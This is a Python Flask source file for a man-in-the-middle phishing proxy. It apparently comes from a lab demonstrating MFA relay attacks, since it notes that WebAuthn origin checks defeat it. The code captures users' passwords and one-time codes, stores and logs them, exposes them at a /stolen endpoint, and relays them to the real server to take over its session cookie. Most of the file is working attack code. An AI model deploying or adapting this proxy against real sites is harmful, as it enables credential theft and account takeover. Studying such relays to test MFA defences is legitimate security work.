from flask import Flask, request, render_template, jsonify, Response, session as flask_session
import requests
from urllib.parse import urljoin
import re

# --- Relay logging additions ---
import os, json, time, datetime, logging
from logging.handlers import RotatingFileHandler
from typing import Any, Optional

LOG_DIR = "logs"
LOG_FILE = os.path.join(LOG_DIR, "relay.jsonl")
os.makedirs(LOG_DIR, exist_ok=True)

relay_logger = logging.getLogger("relay")
relay_logger.setLevel(logging.INFO)
_handler = RotatingFileHandler(LOG_FILE, maxBytes=1_000_000, backupCount=5, encoding="utf-8")
_handler.setFormatter(logging.Formatter("%(message)s"))  # store raw JSON per line
relay_logger.addHandler(_handler)

def _now_iso() -> str:
    return datetime.datetime.utcnow().isoformat(timespec="milliseconds") + "Z"

def log_event(kind: str, **fields: Any) -> None:
    rec = {"ts": _now_iso(), "kind": kind, **fields}
    relay_logger.info(json.dumps(rec, ensure_ascii=False, sort_keys=True))

def _parse_json_safely(body: bytes):
    try:
        return json.loads(body.decode("utf-8"))
    except Exception:
        return {}

app = Flask(__name__, static_folder="static", template_folder="templates")
app.config['SECRET_KEY'] = 'mitm-proxy-session-secret'

REAL_ORIGIN = "http://localhost:5000"
STOLEN = {
    "passwords": [],  # {username, password}
    "otps": []        # {username, code}
}

# Helper to keep real server's session cookie per client
def get_real_cookies():
    cookie = flask_session.get("real_session_cookie")
    return {"session": cookie} if cookie else {}

def store_real_session_cookie(resp):
    # Pull 'session=...' from Set-Cookie
    set_cookie = resp.headers.get("Set-Cookie", "")
    m = re.search(r"session=([^;]+);", set_cookie)
    if m:
        flask_session["real_session_cookie"] = m.group(1)

def strip_hop_by_hop(hdrs: dict):
    # Remove headers that shouldn't be forwarded back
    hop = {"content-encoding", "transfer-encoding", "connection", "keep-alive", "proxy-authenticate",
           "proxy-authorization", "te", "trailers", "upgrade"}
    return [(k, v) for k, v in hdrs.items() if k.lower() not in hop]

# -------- Instrumented forwarders (log latency/status/outcomes) --------
def forward_json(path: str, json_body: dict):
    url = urljoin(REAL_ORIGIN, path)
    cookies = get_real_cookies()

    t0 = time.perf_counter()
    r = requests.post(url, json=json_body, cookies=cookies, allow_redirects=False)
    dt_ms = (time.perf_counter() - t0) * 1000.0

    store_real_session_cookie(r)
    resp_json = _parse_json_safely(r.content)

    relay_ok: Optional[bool] = None
    mfa_result: Optional[str] = None
    mfa_type: Optional[str] = None

    if path == "/login":
        relay_ok = (r.status_code == 200)
        mfa_result = "mfa_required" if resp_json.get("mfa_required") else resp_json.get("message")
    elif path == "/mfa/verify":
        # Lab API returns {result: accepted/rejected, type: totp/hotp, ...}
        mfa_result = resp_json.get("result")
        mfa_type = resp_json.get("type")
        relay_ok = (mfa_result == "accepted")
    elif path in ("/webauthn/login/complete", "/webauthn/register/complete"):
        relay_ok = (r.status_code == 200)

    log_event(
        "relay",
        path=path,
        method="POST",
        client_ip=request.remote_addr,
        status=r.status_code,
        latency_ms=round(dt_ms, 2),
        request=json_body,
        response_summary={
            "message": resp_json.get("message"),
            "error": resp_json.get("error"),
            "result": resp_json.get("result"),
            "type": resp_json.get("type"),
            "matched_offset": resp_json.get("matched_offset"),
            "new_counter": resp_json.get("new_counter"),
            "window": resp_json.get("window"),
            "look_ahead": resp_json.get("look_ahead"),
            "mfa_required": resp_json.get("mfa_required"),
        },
        relay_ok=relay_ok,
        mfa_result=mfa_result,
        mfa_type=mfa_type,
    )

    return Response(r.content, status=r.status_code, headers=strip_hop_by_hop(r.headers))

def forward_raw(path: str):
    url = urljoin(REAL_ORIGIN, path)
    cookies = get_real_cookies()
    req_bytes = request.get_data()

    t0 = time.perf_counter()
    r = requests.request(
        method=request.method,
        url=url,
        headers={k: v for k, v in request.headers if k.lower() != "host"},
        data=req_bytes,
        cookies=cookies,
        allow_redirects=False,
    )
    dt_ms = (time.perf_counter() - t0) * 1000.0

    store_real_session_cookie(r)
    resp_json = _parse_json_safely(r.content)

    log_event(
        "relay",
        path=path,
        method=request.method,
        client_ip=request.remote_addr,
        status=r.status_code,
        latency_ms=round(dt_ms, 2),
        request_body_len=len(req_bytes or b""),
        response_summary={
            "message": resp_json.get("message"),
            "error": resp_json.get("error"),
        },
        relay_ok=(r.status_code == 200)
    )

    return Response(r.content, status=r.status_code, headers=strip_hop_by_hop(r.headers))

# -------- UI (serve same templates) --------
@app.route("/")
@app.route("/home")
def home():
    return render_template("home.html")

@app.route("/signup")
def signup():
    return render_template("signup.html")

@app.route("/account")
def account():
    return render_template("account.html")

# -------- Proxy endpoints (and steal creds) --------
@app.route("/register", methods=["POST"])
def mitm_register():
    return forward_raw("/register")

@app.route("/login", methods=["POST"])
def mitm_login():
    data = request.get_json(force=True, silent=True) or {}
    if "username" in data and "password" in data:
        STOLEN["passwords"].append({"username": data["username"], "password": data["password"]})
        print(f"[MITM] Stole credentials: {data['username']} / {data['password']}")
        log_event("stolen_credentials", username=data["username"], password=data["password"], client_ip=request.remote_addr)
    return forward_json("/login", data)

@app.route("/mfa/enroll", methods=["POST"])
def mitm_enroll():
    return forward_raw("/mfa/enroll")

@app.route("/mfa/verify", methods=["POST"])
def mitm_verify():
    data = request.get_json(force=True, silent=True) or {}
    if "username" in data and "code" in data:
        STOLEN["otps"].append({"username": data["username"], "code": data["code"]})
        print(f"[MITM] Stole OTP for {data['username']}: {data['code']}")
        log_event("stolen_otp", username=data["username"], code=data["code"], client_ip=request.remote_addr)
    return forward_json("/mfa/verify", data)

# WebAuthn: begin/complete are proxied; server origin check will reject on complete.
@app.route("/webauthn/login/begin", methods=["POST"])
def mitm_webauthn_begin():
    return forward_raw("/webauthn/login/begin")

@app.route("/webauthn/login/complete", methods=["POST"])
def mitm_webauthn_complete():
    return forward_raw("/webauthn/login/complete")

@app.route("/webauthn/register/begin", methods=["POST"])
def mitm_webauthn_reg_begin():
    return forward_raw("/webauthn/register/begin")

@app.route("/webauthn/register/complete", methods=["POST"])
def mitm_webauthn_reg_complete():
    return forward_raw("/webauthn/register/complete")

@app.route("/message", methods=["POST"])
def mitm_message():
    return forward_raw("/message")

# -------- Demo helper: view stolen data --------
@app.route("/stolen")
def stolen():
    return jsonify(STOLEN), 200

# -------- Relay log views & metrics --------
def _read_tail_jsonl(path: str, limit: int = 200):
    items = []
    if not os.path.exists(path):
        return items
    with open(path, "r", encoding="utf-8") as f:
        lines = f.readlines()[-limit:]
    for ln in lines:
        try:
            items.append(json.loads(ln))
        except Exception:
            continue
    return items

@app.route("/relay-logs")
def relay_logs_tail():
    limit = int(request.args.get("limit", 200))
    return jsonify(_read_tail_jsonl(LOG_FILE, limit)), 200

@app.route("/relay-logs/clear", methods=["POST"])
def relay_logs_clear():
    open(LOG_FILE, "w", encoding="utf-8").close()
    log_event("control", action="cleared_logs", by=request.remote_addr)
    return jsonify({"message": "relay logs cleared"}), 200

@app.route("/relay-metrics")
def relay_metrics():
    rows = _read_tail_jsonl(LOG_FILE, limit=5000)
    totp_lat = []
    hotp_lat = []
    totp_ok = totp_fail = 0
    hotp_ok = hotp_fail = 0

    for r in rows:
        if r.get("kind") == "relay" and r.get("path") == "/mfa/verify":
            typ = (r.get("mfa_type") or "").lower()
            ok = bool(r.get("relay_ok"))
            lat = r.get("latency_ms")
            if typ == "totp":
                if lat is not None: totp_lat.append(lat)
                if ok: totp_ok += 1
                else: totp_fail += 1
            elif typ == "hotp":
                if lat is not None: hotp_lat.append(lat)
                if ok: hotp_ok += 1
                else: hotp_fail += 1

    def _avg(xs):
        return round(sum(xs)/len(xs), 2) if xs else None

    return jsonify({
        "totp": {
            "accepted": totp_ok,
            "rejected": totp_fail,
            "avg_latency_ms": _avg(totp_lat),
            "samples": len(totp_lat)
        },
        "hotp": {
            "accepted": hotp_ok,
            "rejected": hotp_fail,
            "avg_latency_ms": _avg(hotp_lat),
            "samples": len(hotp_lat)
        }
    }), 200

if __name__ == "__main__":
    print(f"Starting MITM proxy on http://localhost:5001 (forwarding to {REAL_ORIGIN})")
    app.run(host="0.0.0.0", port=5001, debug=False)
